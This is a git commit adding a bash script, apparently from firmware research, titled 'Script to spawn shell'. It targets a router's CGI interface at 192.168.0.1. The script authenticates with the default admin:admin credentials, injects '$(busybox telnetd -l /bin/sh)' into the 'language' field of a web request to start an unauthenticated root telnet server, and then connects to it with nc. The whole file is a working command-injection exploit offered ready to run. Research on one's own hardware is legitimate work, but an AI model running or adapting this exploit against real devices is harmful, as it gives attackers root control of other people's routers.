76bd04f68166bd53804112db6a77e97aeb656b0f
T <T>
2024-08-30 23:34:47 +0200

    Script to spawn shell

---
+++ firmware_research/open.sh
@@ -0,0 +1,17 @@
+#!/usr/bin/env bash
+
+nonce=$(curl -s 'http://192.168.0.1/cgi-bin/qcmap_auth' -X POST  -d '{"module":"authenticator","action":0}' | jq -r .nonce)
+md5=$(printf "%s:%s:%s" admin admin "$nonce" | md5sum | cut "-d " -f1)
+printf "Nonce: %s\nMD5: %s\n" "$nonce" "$md5"
+
+token=$(curl -s 'http://192.168.0.1/cgi-bin/qcmap_auth' -d '{"module":"authenticator","action":1,"digest":"'"$md5"'"}' | jq -r .token)
+
+printf "Token: %s\n" "$token"
+
+curl -s 'http://192.168.0.1/cgi-bin/qcmap_web_cgi' -b "tpweb_token=$token" -d '{"token":"'"$token"'","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}' > /dev/null
+curl -s 'http://192.168.0.1/cgi-bin/qcmap_web_cgi' -b "tpweb_token=$token" -d '{"token":"'"$token"'","module":"webServer","action":1,"language":"en"}' > /dev/null
+
+echo Done.
+
+(stty -icanon -echo; nc -O1 192.168.0.1 23)
+stty icanon echo
